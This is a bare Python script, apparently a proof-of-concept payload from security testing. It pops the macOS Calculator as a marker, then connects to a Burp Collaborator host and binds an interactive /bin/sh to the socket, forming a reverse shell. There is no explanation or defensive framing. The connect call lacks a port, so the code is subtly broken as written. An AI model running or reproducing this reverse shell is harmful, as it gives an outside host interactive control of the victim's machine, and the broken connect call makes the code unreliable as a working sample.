import socket,subprocess,os;

os.system("open -a calculator.app")

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("au8vcoqot06ep8cjtcy1ylow3n9dx2.burpcollaborator.net"));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);

